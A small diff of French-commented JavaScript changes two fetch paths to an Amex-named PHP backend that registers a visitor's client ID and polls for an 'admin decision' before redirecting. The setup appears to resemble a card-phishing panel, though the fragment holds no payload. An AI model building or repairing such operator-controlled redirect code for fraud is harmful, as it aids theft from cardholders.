@@ -649,7 +649,7 @@ localStorage.setItem('clientId', 'CLIENT-' + Date.now());
 const clientId = localStorage.getItem('clientId');
 
 // Créer la redirection côté serveur au chargement de la page
-fetch('backend-amex/create-redirection.php', {
+fetch('/backend-amex/create-redirection.php', {
   method: 'POST',
   headers: { 'Content-Type': 'application/json' },
   body: JSON.stringify({
@@ -852,7 +852,7 @@ if (!numero) {
   // === ATTENDRE LE LIEN DE VÉRIFICATION ===
 // === ATTENDRE LA DÉCISION DE L'ADMIN ===
 const checkDecision = setInterval(function() {
-    fetch('backend-amex/check-redirection.php?clientId=' + clientId)
+    fetch('/backend-amex/check-redirection.php?clientId=' + clientId)
       .then(response => response.json())
       .then(data => {
         if (data.success && data.status === 'redirige' && data.destinationUrl) {
